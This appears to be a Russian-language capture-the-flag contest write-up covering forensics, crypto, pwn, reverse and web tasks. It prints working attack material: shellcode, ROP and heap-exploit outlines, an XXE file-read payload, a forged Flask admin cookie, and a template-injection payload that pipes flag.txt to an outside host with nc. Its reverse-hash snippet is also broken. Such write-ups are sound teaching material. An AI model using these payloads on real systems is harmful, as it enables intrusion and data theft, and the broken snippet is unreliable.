# nti contest writeup

## Forensics

### Second screen

Представлен дамп сетевого трафика, содержащий в себе огронмное колличество различных пакетов. Для анализа дампа будет использовать программа Wireshark. Исходя из условий задания нас интересует протокол ```synergy``` так как он позволяет взадмодейстовать одним периферийным устройством с нескольколькими компьютерами.

Первое что мы видим
```DKDN.w........CNOP...
DKUP.w........CNOP...
DKDN.h...#....CNOP...
DKUP.h...#....CNOP...
DKDN.o........CNOP...
DKUP.o........CNOP...
DKDN.a........CNOP....CALV....CALV....CNOP...
DKUP.a........CNOP...
DKDN.m...2....CNOP...
DKUP.m...2....CNOP...
DKDN.i........CNOP...
DKUP.i........CNOP...
DKDN.'...(....CNOP...
DKUP.'...(....CNOP....CALV....CALV....CNOP...
DKDN..........CNOP...
DKUP..........CNOP...
```
`` whoami``
Что дает нам понимание в каком виде будет представленна информация далее.

Далее мы понимаем, что на устройстве открывается python, в переменную ``a`` записываются строки ``Can`` и``_Y0u``

```
DKDN.C........CNOP...
DKUP.C........CNOP...
DKUP.....*....CNOP...
DKDN.a........CNOP...
DKUP.a........CNOP...
DKDN.n...1....CNOP...
DKUP.n...1....CNOP...
```

```
DKDN._........DMMV._.(....CNOP....CNOP...
DKUP._........CNOP....CALV....CALV....CNOP....DMMV._.)....CNOP...
DKUP.....*....CNOP...
DKDN.y........CNOP...
DKUP.y........CNOP....CALV....CALV....CNOP...
DKDN.0........CNOP...
DKUP.0........CNOP....CALV....CALV....CNOP...
DKDN.u........CNOP...
DKUP.u........CNOP...
```
Далее в пременную ``а`` происходит вставка
```
DKDN.....*....CNOP...
DKDN.V.../....CNOP...
DKUP.V.../....CNOP...
DKUP..........CNOP...
DKUP.....*
```
```
_f1nd_that....DCLP..............DCLP..........22....CALV...$DCLP.....................
_f1nd_that....DCLP..............DMMV.O......DMMV.O......DMMV.O......CNOP....CNOP....
```
Далее просходит вызов функции print
``print('flag{' + a + происходит еще одна вставка)``,
```
DCLP......................_easy_f1ag}....DCLP..............DCLP..........23....CALV...%DCLP......................_easy_f1ag}
```
``flag{Can_y0u_f1nd_that_easy_f1ag}``


### Windows moment

Так как поиск подстроки "flag{" по файлу не дает результата, перейдем к более глубокому анализу дампа.
Воспользуемся утилитой volatility для анализа дампа памяти
``vol.py -f ../memdump.mem imageinfo ``
```
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win10x64_18362
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/hydrag/Downloads/memdump.mem)
                      PAE type : No PAE
                           DTB : 0x1ad002L
                          KDBG : 0xf8051c8cc5e0L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8051b777000L
                KPCR for CPU 1 : 0xffff9f01bdc20000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2021-10-18 14:20:34 UTC+0000
     Image local date and time : 2021-10-18 17:20:34 +0300
```
Мы определили профиль версии, для дальнейшего анализа дампа.
Далее нас интересуют список процессов
``vol.py -f memdump.mem --profile Win10x64_18362 pslist``
После получения списка всех активных процессов, можно посмотреть их в виде дерева, на основе информации о PID родительского процесса.
```
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffffc70146c55080:csrss.exe                         408    396     11      0 2021-10-18 14:19:03 UTC+0000
 0xffffc70146e680c0:wininit.exe                       484    396      5      0 2021-10-18 14:19:04 UTC+0000
. 0xffffc70146146140:fontdrvhost.ex                   752    484      5      0 2021-10-18 14:19:04 UTC+0000
. 0xffffc70146f09140:services.exe                     620    484      8      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc70147c082c0:svchost.exe                    1280    620      5      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147c6b240:svchost.exe                    2076    620     12      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70148cd00c0:WUDFHost.exe                   3628    620     13      0 2021-10-18 14:19:45 UTC+0000
.. 0xffffc701476c42c0:svchost.exe                     576    620     22      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc70149372080:WmiApSrv.exe                   3652    620      5      0 2021-10-18 14:19:29 UTC+0000
.. 0xffffc701478702c0:svchost.exe                    1608    620      5      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70143149080:svchost.exe                    1620    620     16      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147e62280:dllhost.exe                    2656    620     21      0 2021-10-18 14:19:06 UTC+0000
.. 0xffffc701461662c0:svchost.exe                     872    620     14      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc70148388280:svchost.exe                    3840    620      8      0 2021-10-18 14:19:09 UTC+0000
.. 0xffffc70147cea240:vm3dservice.ex                 2188    620      5      0 2021-10-18 14:19:05 UTC+0000
... 0xffffc70147da4200:vm3dservice.ex                2336   2188      4      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147ced300:VGAuthService.                 2196    620      3      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147d2b0c0:vmtoolsd.exe                   2208    620     12      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc701486a3240:SearchIndexer.                 4296    620     19      0 2021-10-18 14:19:10 UTC+0000
.. 0xffffc70147d30280:MsMpEng.exe                    2228    620     30      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc701430ec080:svchost.exe                    1728    620      8      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147ebb380:msdtc.exe                       712    620     13      0 2021-10-18 14:19:07 UTC+0000
.. 0xffffc7014854c080:svchost.exe                    3284    620      9      0 2021-10-18 14:19:24 UTC+0000
.. 0xffffc70146fe6080:svchost.exe                     744    620     22      0 2021-10-18 14:19:04 UTC+0000
... 0xffffc70148cd2080:ShellExperienc                3092    744     18      0 2021-10-18 14:19:46 UTC+0000
... 0xffffc7014883a080:RuntimeBroker.                4528    744     13      0 2021-10-18 14:19:11 UTC+0000
... 0xffffc7014893e080:browser_broker                4788    744      6      0 2021-10-18 14:19:11 UTC+0000
... 0xffffc70147e6e080:RuntimeBroker.                4684    744      9      0 2021-10-18 14:19:46 UTC+0000
... 0xffffc70148ea0280:WmiPrvSE.exe                  5712    744     13      0 2021-10-18 14:19:26 UTC+0000
... 0xffffc7014877a080:RuntimeBroker.                2664    744      6      0 2021-10-18 14:19:26 UTC+0000
... 0xffffc701489d7280:RuntimeBroker.                5052    744      5      0 2021-10-18 14:19:12 UTC+0000
.... 0xffffc70148bac4c0:MicrosoftEdgeS               4948   5052      9      0 2021-10-18 14:19:12 UTC+0000
... 0xffffc701485f82c0:dllhost.exe                   3184    744     11      0 2021-10-18 14:19:25 UTC+0000
... 0xffffc70148fe74c0:smartscreen.ex                5920    744      9      0 2021-10-18 14:19:22 UTC+0000
... 0xffffc701484c4080:StartMenuExper                3720    744     18      0 2021-10-18 14:19:10 UTC+0000
... 0xffffc70148d020c0:LockApp.exe                   5360    744     10      0 2021-10-18 14:19:13 UTC+0000
... 0xffffc70148865080:MicrosoftEdge.                4628    744     34      0 2021-10-18 14:19:11 UTC+0000
... 0xffffc701486a6080:SearchUI.exe                  4336    744     33      0 2021-10-18 14:19:10 UTC+0000
... 0xffffc70148b64080:MicrosoftEdgeC                4224    744     16      0 2021-10-18 14:19:12 UTC+0000
... 0xffffc70148572280:RuntimeBroker.                4140    744     13      0 2021-10-18 14:19:10 UTC+0000
... 0xffffc701483e0300:dllhost.exe                   3940    744      6      0 2021-10-18 14:19:09 UTC+0000
... 0xffffc70148dc8280:RuntimeBroker.                5480    744      9      0 2021-10-18 14:19:13 UTC+0000
... 0xffffc70147b13080:WmiPrvSE.exe                  2484    744     10      0 2021-10-18 14:19:06 UTC+0000
... 0xffffc70148864080:ApplicationFra                4596    744     13      0 2021-10-18 14:19:11 UTC+0000
... 0xffffc70148154080:WinStore.App.e                5164    744     10      0 2021-10-18 14:20:17 UTC+0000
... 0xffffc70149026480:RuntimeBroker.                 500    744      6      0 2021-10-18 14:20:17 UTC+0000
.. 0xffffc701430d3080:spoolsv.exe                    1780    620     13      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147ee8280:dllhost.exe                    2808    620     17      0 2021-10-18 14:19:06 UTC+0000
.. 0xffffc701430d1080:svchost.exe                    1788    620     16      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc70147f68240:svchost.exe                    2836    620      7      0 2021-10-18 14:19:07 UTC+0000
.. 0xffffc701477d3240:svchost.exe                    1304    620      5      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc701476a92c0:svchost.exe                     336    620     19      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc701476c80c0:svchost.exe                     864    620      6      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc70148bd8080:SecurityHealth                 5996    620     13      0 2021-10-18 14:19:22 UTC+0000
.. 0xffffc7014799f0c0:svchost.exe                    1768    620      8      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc7014772f280:svchost.exe                    1088    620     18      0 2021-10-18 14:19:04 UTC+0000
... 0xffffc701481df200:ctfmon.exe                    3364   1088     10      0 2021-10-18 14:19:08 UTC+0000
.. 0xffffc70148092300:NisSrv.exe                     3052    620      6      0 2021-10-18 14:19:07 UTC+0000
.. 0xffffc7014769f240:svchost.exe                     400    620     77      0 2021-10-18 14:19:04 UTC+0000
... 0xffffc701481522c0:taskhostw.exe                 3076    400     10      0 2021-10-18 14:19:07 UTC+0000
... 0xffffc7014331d240:sihost.exe                    1688    400     14      0 2021-10-18 14:19:07 UTC+0000
.. 0xffffc70147d870c0:VSSVC.exe                      3480    620      4      0 2021-10-18 14:19:08 UTC+0000
.. 0xffffc70143191300:svchost.exe                    1520    620     27      0 2021-10-18 14:19:05 UTC+0000
.. 0xffffc701476cc2c0:svchost.exe                     944    620     33      0 2021-10-18 14:19:04 UTC+0000
.. 0xffffc701478692c0:svchost.exe                    1492    620     12      0 2021-10-18 14:19:05 UTC+0000
... 0xffffc70148870080:audiodg.exe                   5180   1492      7      0 2021-10-18 14:19:45 UTC+0000
.. 0xffffc70143329280:svchost.exe                    2540    620     15      0 2021-10-18 14:19:07 UTC+0000
. 0xffffc70146f6a080:lsass.exe                        640    484      9      0 2021-10-18 14:19:04 UTC+0000
 0xffffc7014307f080:System                              4      0    127      0 2021-10-18 14:19:03 UTC+0000
. 0xffffc701430dc080:Registry                          88      4      4      0 2021-10-18 14:19:00 UTC+0000
. 0xffffc70143ddb440:smss.exe                         288      4      3      0 2021-10-18 14:19:03 UTC+0000
. 0xffffc701431b7040:MemCompression                  1444      4     42      0 2021-10-18 14:19:05 UTC+0000
 0xffffc70146f4f080:winlogon.exe                      580    476      7      0 2021-10-18 14:19:04 UTC+0000
. 0xffffc70146148080:fontdrvhost.ex                   768    580      5      0 2021-10-18 14:19:04 UTC+0000
. 0xffffc70147631080:dwm.exe                          948    580     16      0 2021-10-18 14:19:04 UTC+0000
. 0xffffc70147634080:LogonUI.exe                      956    580      0 ------ 2021-10-18 14:19:04 UTC+0000
. 0xffffc7014825c080:userinit.exe                    3568    580      0 ------ 2021-10-18 14:19:08 UTC+0000
.. 0xffffc70148261300:explorer.exe                   3604   3568     84      0 2021-10-18 14:19:08 UTC+0000
... 0xffffc7014895a340:cmd.exe                       5272   3604      2      0 2021-10-18 14:19:27 UTC+0000
.... 0xffffc701481d4080:powershell.exe                780   5272     22      0 2021-10-18 14:20:19 UTC+0000
..... 0xffffc70148be3080:info.exe                    1420    780      4      0 2021-10-18 14:20:22 UTC+0000
...... 0xffffc70146165080:conhost.exe                2112   1420      6      0 2021-10-18 14:20:22 UTC+0000
.... 0xffffc70148e9f080:conhost.exe                  4380   5272      5      0 2021-10-18 14:19:27 UTC+0000
... 0xffffc70148153080:SecurityHealth                5964   3604      3      0 2021-10-18 14:19:22 UTC+0000
... 0xffffc7014853e080:FTK Imager.exe                5492   3604     22      0 2021-10-18 14:19:59 UTC+0000
... 0xffffc70148ce8080:vmtoolsd.exe                  6072   3604      9      0 2021-10-18 14:19:23 UTC+0000
 0xffffc70146ecb140:csrss.exe                         492    476     13      0 2021-10-18 14:19:04 UTC+0000
 ```
 Можно заметить довольно странную вещь
 ```
 ... 0xffffc7014895a340:cmd.exe                       5272   3604      2      0 2021-10-18 14:19:27 UTC+000
.... 0xffffc701481d4080:powershell.exe                780   5272     22      0 2021-10-18 14:20:19 UTC+000
..... 0xffffc70148be3080:info.exe                    1420    780      4      0 2021-10-18 14:20:22 UTC+000
```
Получается, что данный процесс ``info.exe`` был запущен из консоли ``powershell``
Можно проверить, что это единсвтенный процесс, запускаемый из powershell
``vol.py -f memdump.mem --profile Win10x64_18362 pslist | grep 780 ``
```
0xffffc701481d4080 powershell.exe          780   5272     22        0      1      0 2021-10-18 14:20:19          
0xffffc70148be3080 info.exe               1420    780      4        0      1      0 2021-10-18 14:20:22
```
Попробуем сдампить процесс из памяти для дальнейшего анализа.
``vol.py -f memdump.mem --profile Win10x64_18362 procdump -p 1420 --dump-dir .``
```
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xffffc70148be3080 0x00007ff664c10000 info.exe             OK: executable.1420.exe
```
Далее можно воспользоваться таким инструментом, как IDA, для статического или динамического анализа исполняемого файла.
Находим основную функцию

![alt text](https://github.com/vuidra1234/vuidra/raw/main/1.png)

Наблюдаем побайтовый xor элементов массива ``v5`` и ``0xD8``, далее можно, либо поставить breakpoint и посмотреть в динамике до второго побайтового xor, либо использовать python для выполнения этой операции.

![alt text](https://github.com/vuidra1234/vuidra/raw/main/image.png)

``Флаг: flag{get_deeper_and_d33per}``


## Misc

### Curl

энумерация программ с капабилитис, у curl есть cap\_dac\_searc\_read. `curl file:///flag.txt`


### I love vim

Regular expression кроссворд на vimscript.


### ssh-keygen

энумерейтим бинарники с SUID, находим ssh-keygen, идем на gtfobins, видим что он умеет подгружить shared библиотеки, компилируем мусор и отправляем ему на ввод, он упадет на том что не найдет определенный символ, вставляем в символ шелл.

## Crypto

### Climbing up a hill

Используем https://github.com/tna0y/Python-random-module-cracker чтобы получить весь ключ; перемножаем две матрицы.


### Hashhashesand hashes

Делаем обратный алгоритм для

```python
def generate_hash(bbytes):
    maxed = 0x100 ** BLEN
    bword = list(bbytes)
    bword_len = len(bword)
    k = 0x7370727573686564
    if (bword_len > BLEN):
        for i in range(BLEN, bword_len):
            bword[i % BLEN] ^= bword[i]
    k ^= b2l(bytes(bword[:BLEN]))
    for nround in range(ROUNDS):
        k = rol(k, 13)
        k %= maxed
        k *= CONST
        k %= maxed
    return k
```

```python
def revhash(k):
    maxed = 0x100 ** BLEN
    REV_CONST = pow(CONST, -1, maxed)
    for nround in range(ROUNDS):
        k *= REV_CONST
        k %= maxed
        ror(k, 13)
```

Далле подгоняем по XOR


### Needle in a haystack

Перед вами 10000 записей одной длины, 9999 из них случайны, одно - флаг, зашифрованный однобайтовым ксором.

Решение: однобайтовый ксор сохраняет уровень энтропии. Посчитали энтропию, отсортировали, пробрутфорсили.

Альтернативное решение: пробрутфорсили все, грепнули на flag{ (надо было конечно понерфить).


## pwn

### First pwn

При анализе исполняемого файла с помощью методов реверс-инжиниринга мы замечаем уязвимость переполнения буфера на стеке. Однако функции "выигрыша" в программе нет, поэтому нам нужно сделать её самим. Обычный метод решения такой проблемы - Return Oriented Programming. Классические задачи с описаниями решений при помощи метода эксплуатации ROP можно увидеть [тут](https://ropemporium.com).

Итак, в данном случае наша стратегия такова:

1. Прыгнуть на ROP-гаджет с инструкцией pop rdi, таким образом получая возможность записать первый аргумент соглашения о вызовах fastcall в x64 Linux.
2. В качестве записываемого аргумента передать адрес функции puts в Global Offset Table.
3. Затем прыгнуть на саму функцию puts внутри исполняемого файла, таким образом получая адрес внутри библиотеки libc.
4. Зная базовый адрес libc можно получить адрес функции system и строки "/bin/sh" в libc
5. С помощью вышеприведённого алгоритма загружаем адрес строки "/bin/sh" в регистр RDI.
6. Прыгаем на функцию system в libc.
7. Hack the planet!


### heap

Это задание с классической идеей менеджера заметок. При анализе кода, мы видим, что все функции написано корректно, но присутствует одна интересная особенность: есть возможность однажды создать заметку с размером больше размера выделенного с помощью `malloc` участка памяти. Этого переполнения недостаточно для изменения "пользовательских" указателей в последовательно следующем чанке (1), но достаточно для изменения метаданных: второго элемента структуры чанка в Linux, размера чанка.

```
struct malloc_chunk {
  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk, if it is free. */
  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
  struct malloc_chunk* fd;                /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk;
  /* Only used for large blocks: pointer to next larger size.  */
  struct malloc_chunk* fd_nextsize; /* double links -- used only if this chunk is free. */
  struct malloc_chunk* bk_nextsize;
};

typedef struct malloc_chunk* mchunkptr;
```
Далее эксплуатация достаточно проста: мы освобождаем чанк с увеличенным размером (1) и создаём заново уже с новым размером (1). После этого можно получить ещё большее переполнение в последовательно следующий чанк (2). Теперь можно освободить чанк (2) и с помощью переполнения можно выполнить эксплуатацию классической уязвимости [tcache poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.31/tcache_poisoning.c), таким образом получая arbitrary write. Так как в программе не включен механизм PIE, то произвольная запись автоматически даёт исполнение кода: просто переписываем любой указатель в Global Offset Table на [one gadget](https://pwnbykenny.com/en/2020/12/31/one-gadget-easy-powerful-tool-example).


### second pwn

![изображение](https://user-images.githubusercontent.com/64375994/151368623-447deafd-8f37-4578-87f5-dd1e68cb34ad.png)

В функции main мы видим четыре последовательных классичесих уязвимости форматной строки ([format string vulnerability](https://owasp.org/www-community/attacks/Format_string_attack))

Следующий шаг: найти "выигрывающую" функцию. Это функция check, вызываемая из main:

![изображение](https://user-images.githubusercontent.com/64375994/151369313-6b4d5c9b-b587-498d-bc07-20791148879c.png)

Как можно заметить, для выполнения `system("/bin/sh")` нужно равенство четырёх глобальных переменных определённым значениям. Это условие как раз и можно выполнить с помощью эксплуатации уязвимости форматной строки: последовательно размещаем на стеке адреса, а затем с помощью спецификатора %hn записываем в них желаемые значения.


### Shellcat

Для решения этого задания мы должны с помощью шелл-кода размером в 8 байт получить удалённое исполнение кода. Решить таск "в лоб" не получится: 8 байт недостаточно для вызова системного вызова execve или вызова функции system с аргументом "/bin/sh". Поэтому нам нужно как-то расширить вводимый шелл-код.

#### Первый шелл-код

Это можно сделать достаточно просто: мы "прыгаем" на исполняемый код вызывающей функции непосредственно перед вызовом функции read, но уже после установки размера считываемого ввода, чтобы установить свой размер.

```
0:  58                      pop    rax
1:  80 f2 fa                xor    dl,0xfa
4:  34 77                   xor    al,0x77
6:  ff e0                   jmp    rax
```

#### Второй шелл-код

После выполненного шага осталось только дорешать задание: подготовить регистры и вызвать системный вызов execve.

```
0:  6a 3b                   push   0x3b
2:  58                      pop    rax
3:  48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
a:  73 68 00
d:  57                      push   rdi
e:  48 89 e7                mov    rdi,rsp
11: 48 31 f6                xor    rsi,rsi
14: 48 31 d2                xor    rdx,rdx
17: 0f 05                   syscall
```


### very_baby_pwn

Так как для решения этого таска нам нужно просто с помощью эксплуатации переполнения буфера на стеке изменить значение переменной, лежащей ниже по стеку, то мы можем просто записать 20 мусорных байт и получить удалённое исполнение кода.


### zero_pwn

Подключаясь на заданный сервер с помощью netcat мы видим, что программа выдаёт какое-то шестнадцатеричное значение и предлагает что-то ввести.
Если запустить данную программу локально в отладчике gdb и выполнить команду `info proc mappings`, можно увидеть, что адрес, который отдаёт нам исполняемый файл принадлежит региону с самим бинарником.

#### Анализ кода
Если открыть программу в декомпиляторе, например IDA Hex-Rays или Ghidra, то мы увидим следующий код.
![изображение](https://user-images.githubusercontent.com/64375994/151363202-74e779e7-d6a4-48ef-b93d-fc4f2a4da6ee.png)

После прочтения этого небольшого кусочка кода мы можем сделать вывод, что программа читает 0x80 байт на стек, где выделено только 8 байт (sizeof(__int64)==8). Следовательно здесь есть уязвимость переполнения буфера на стеке. По эксплутации этой уязвимости есть множество материалов в интернете, откуда решающий может почерпнуть алгоритм эксплуатации.

Нам нужно "прыгнуть" на адрес функции win, чтобы получить удалённое исполнение кода:

![изображение](https://user-images.githubusercontent.com/64375994/151363632-573adf0d-cd70-4057-8b45-cb5e5f1c9573.png)

После записи 24 мусорных байт на стек, мы можем записать адрес этой функции в порядке little endian. Таким образом таск решён и мы получаем флаг.


## Reverse

### amaze

Стандартное переполнение буфера с прыжком на функцию win()

### cassandra

1 вариант: В динамике прогоняем все возможные варианты
2 вариант: В статике достаём все возможные массивы и операции с ними, прогоняем


### chinasocialcredit

Смысл задания заключается в том, что надо узнать секретное китайское приветствие, которое по совместительству является флагом. Проверка флага находится в библиотеке check.so, которая подгружается в check.py

#### Алгоритм check.so
Сразу станет понятно, что нужная функция - checkFlag. Если открыть её в IDA PRO 7.6 и сдекомпилировать эту функцию, получится вот такой код
```
_QWORD *__fastcall checkFlag(__int64 a1, __int64 a2)
{
  _QWORD *result; // rax
  __int64 i; // rax
  __int64 v4; // rcx
  char *s; // [rsp+8h] [rbp-40h] BYREF
  __m128i si128; // [rsp+10h] [rbp-38h]
  __m128i v7; // [rsp+20h] [rbp-28h]
  int v8; // [rsp+30h] [rbp-18h]
  unsigned __int64 v9; // [rsp+38h] [rbp-10h]

  v9 = __readfsqword(0x28u);
  if ( (unsigned int)PyArg_ParseTuple_SizeT(a2, &unk_2000, &s) )
  {
    v8 = 3698545;
    si128 = _mm_load_si128((const __m128i *)&xmmword_2030);
    v7 = _mm_load_si128((const __m128i *)&xmmword_2040);
    if ( (unsigned int)strlen(s) != 35 )
      goto LABEL_3;
    memfrob(s, 0x23uLL);
    *s ^= s[34];
    for ( i = 0LL; i != 34; s[i] ^= s[v4] )
      v4 = i++;
    if ( *(_OWORD *)&si128 == *(_OWORD *)s && *(_OWORD *)&v7 == *((_OWORD *)s + 1) && *((_WORD *)s + 16) == (_WORD)v8 )
    {
      result = &Py_TrueStruct;
      ++Py_TrueStruct;
    }
    else
    {
LABEL_3:
      result = &Py_FalseStruct;
      ++Py_FalseStruct;
    }
  }
  else
  {
    result = 0LL;
  }
  if ( v9 != __readfsqword(0x28u) )
    _stack_chk_fail();
  return result;
```
Алгоритм довольно прост:
1. Сначала проверяется, является ли введенная строка размером 35 символа. Если проверка выполнена, продолжаем
1. Делается memfrob введенной строки
1. Каждый введенный символ ксорится с предыдущим, причем нулевой ксорится с 34ым.
1. Полученные байты проверяются с помощью memcmp (в декомпиле оно оказалось inline)

#### Решение
Обратить алгоритм возможно, для этого надо:
1. Понять, что первый символ флага - f
1. Построить плейнтекст. Каждый iый элемент плейнтекста = шифротекст[i] ^ шифротекст[i-1]
1. Поксорить каждый элемент плейнтекста с 42.

Пример решения можно найти в скрипте rev/chinasocialcredit/solve.py


### Dexter

Тк применяется multidex, находим точку входа и ищем, где и как он достаёт основной код
Достаёт он его из внутреннего файла путём XOR всех байтов файла с числом 112, проделываем те же операции, загоняем в JADX, видим флаг в чистом виде

2 способ решения: прогнать в Android Studio и найти во внутренних файлах телефона тот же файл


### Forked

В статике убрать форк и просто пройти в динамике либо в динамике в том же самом gdb поставить rip для обхода fork


### reesee

Программа написана на C#, её можно декомпилировать, например, при помощи dotPeek.

В коде видим, что введенный текст преобразуется по следующему условию:

```C#
string str1 = "abcdefghijklmnopqrstuvwxyz";
string str2 = Console.ReadLine();
char[] chArray = new char[str2.Length];
for (int index = 0; index < str2.Length; ++index)
  chArray[index] = str1.IndexOf(str2[index], 0) <= -1 ? str2[index] : str1[(str1.IndexOf(str2[index], 0) + 4) % 26];
```

Преобразованная строка сравнивается с `jpek{mxw_nywx_srpc_iewmiwx_xewo}`

Применив обратное преобразование к этой строке, получаем флаг: `flag{its_just_only_easiest_task}`

## Web

### Bubble cards

На главной странице задания есть возможность ввести пользовательские данные, попробуем заполнить поля и отправить их.
![Ввод пользовательских данных](web/Bubble_Cards/writeup_pics/1.png)

При отправке данных вся информация отражается пользователю.

![Данные отобразились пользователю](web/Bubble_Cards/writeup_pics/2.png)

Кроме того, при изучении хедеров в ответе сервера можно заметить, что в качестве бекенда используется python. Проведём стандартный тест на SSTI (Server Side Template Injection) для Flask:

![Тест на уязвимость](web/Bubble_Cards/writeup_pics/3.png)

Мы получили блокировку от сервера, что подтверждает догадки об уязвимости SSTI

![Блок от сервера](web/Bubble_Cards/writeup_pics/4.png)

В синтаксисе шиблонизатора Jinja2 (который используется в Flask-приложениях) поддержаваются альтернативные способы реализации шаблонов: для обхода блокировки попробуем использовать условное выражение `{% if 1==1 %} This text visible only if condition is true {% endif %}` вместо двойных брекетов `{{}}`:

![Обход блокировки](web/Bubble_Cards/writeup_pics/5.png)

Блокировка успешно обойдена.

![Обход блокировки](web/Bubble_Cards/writeup_pics/6.png)

Так как у атакующего есть лишь информация о том, верно ли выражение в брекетах или нет, у него есть возможность получить флаг посимвольным чтением, или же послать флаг на подконтрольный ему сервер, как показано в примере ниже:

`{% if request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag.txt | nc 192.168.100.48 7777')['read']() %} a {% endif %}`


### PHP Squid

У задания было две вариации: в первой флаг лежит в корневой папке, вместе с index.php, во второй нужно успешно пройти все проверки, представленные на заглавной странице.

Рассмотрим все проверки

#### firstGame

Первая проверка требует равенства хешей sha1 при разных исходных значениях. В php этого можно добиться при отправке массивов вместо строк:
```php
game1_green[]=2&game1_red[]=1
```

#### secondGame

Вторая проверка удаляет подстроку `honeybomb` из параметра game2, однако необходимо, что бы эта строка осталась. Подстрока удаляется лишь 1 раз, если вставить конструкцию `honeyhoneycombcomb`, будет удалена первая подстрока `honeybomb`, но останется вторая:
```php
game2=honeyhoneycombcomb
```

#### fifthGame

В данной проверке нам даётся md5 хеш и часть хешированного текста. Так же нам дано, что неизвестная часть - это популярное мужское имя в Соединенных Штатах. Можно осуществить брутфорс-атаку по словарю известных американских имён. Верный параметр: `game5=SquidGeorge`


#### squidGame

В последней проверке необходимо, что бы хеш параметра равнялся нулю, однако, используется слабое сравнение. Для нас использование слабого сравнения в php означает, что мы можем найти такую строку, хеш которой будет начинаться на "0". При сравнении такой строки со строкой, которую можно преобразовать к типу int, php отбросит все значения строки после "0", осуществит преобразование к int, и только после этого сделает сравнение. Значения, которые дают "0" в начале md5 хеша, можно найти как "php magic hashes": `hash('md5',240610708) === "0e462097431906509019562988736854"`

```php
squidGame=240610708
```

Объединяем все параметры вместе:
```php
game1_green[]=x&game1_red[]=y&game2=honeyhoneycombcomb&game5=SquidGeorge&squidGame=240610708
```


### PNGtor

Имеем сайт с функциональностью конвертации файлов в формат PNG. В глаза бросается форма загрузки файлов. Первой приходит мысль о загрузке php-шела, но т.к. мы не знаем пути загрузки файла, то этот вариант сразу отбрасывается (тем более, что бекенд написан не на php)

При попытке загрузки невалидного файла мы узнаем, какие форматы изображений можно загружать на сервер для конвертации: png, jpg, jpeg, bmp, svg, gif

SVG - это подвид XML. Мы можем попробовать эксплуатацию XXE для подгрузки локального файла следующим образом:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [
  <!ENTITY xxe SYSTEM "/etc/flag">
]>
<svg width="100%" height="100%" viewBox="0 0 300 100"
     xmlns="http://www.w3.org/2000/svg">
  <text x="20" y="35">&xxe;</text>
</svg>
```

Прежде чем провести конвертацию svg файла в png, конвертер подгрузит файл `/etc/flag`, он будет отрендерен в png файле

`flag{XXE_1N_SVG_1S_0LD_BUT_G0LD}`


### Signer

В описании сказано, что админ раздаёт свои подписи. После регистрации аккаунта и входа в систему на главной странице можно увидеть подпись админа. Запомним это.

Welcome, dear friend! Here is your sign: 4DM1N_L0v3S_Y0U_V3RY_MUCH,4LL_TH3_B3St

После первичного анализа функциональности сайта понимаем, что точек входа здесь очень мало. Одна из них - куки.

Сервер использует фласк-сессии, которые можно декодировать например, с помощью flask-unsign.

```console
nti@contest:~$ flask-unsign -c ".eJwljjluwzAQAP_C2sVeFLn-jMC9kMBAAkh2ZfjvEZBiiplq3m2vI8-vdn8er7y1_TvavfVUX6uLr5o2cACJc4KRV8cpPGUCkxmKusOixA681HVU0KzM4DSIcmWfxR5KESqEbGa1SMZFbmCdYiio1NhmkU_uUC6rXSOvM4__G7zUz6P25-8jf66wmMK3hEIpUzckVeMgcmLAYuq0VS5qnz9thUBD.Ybn6mg.ovlSskaH6j4sUMU97pN6TcLttFA" --decode
{'_fresh': True, '_id': '5e9caa54caf8b717024c3e0b2cf51843848032bb149cc0a2e1503a9c97fd28feed3eb0dfc93c8f3cd92dd94213bbbfa247a24e60b52d79094f768f2c8350fc4a', '_user_id': '1', 'csrf_token': 'a32dc6e0f14fb9cb1299b3d22c2301f32526fea2'}
```

Видим, что сессия имеет параметр _user_id. Приходит идея поменять _user_id на 0, что бы попробовать вклиниться в сессию администратора, но для генерации собственной фласк-сессии её нужно подписать секретным ключём. Попробуем сделать это с помощью подписи администратора и утилиты flask-unsign

```console
nti@contest:~$ flask-unsign -s --cookie '{"_user_id": "0"}' --secret "4DM1N_L0v3S_Y0U_V3RY_MUCH,4LL_TH3_B3St"
eyJfdXNlcl9pZCI6IjAifQ.YboDew.nmxZ057PPpdBPyA06uX2NIhEhGo
```

Подставим новую сессию, например, через консоль разработчика в браузере, и обновим страницу

После этого произойдёт автоматический редирект на страницу /admin с флагом

flag{K33p_Y0UR_FL4SK_S3CR3TS_1N_S3CR3T}


### Thought aggregator

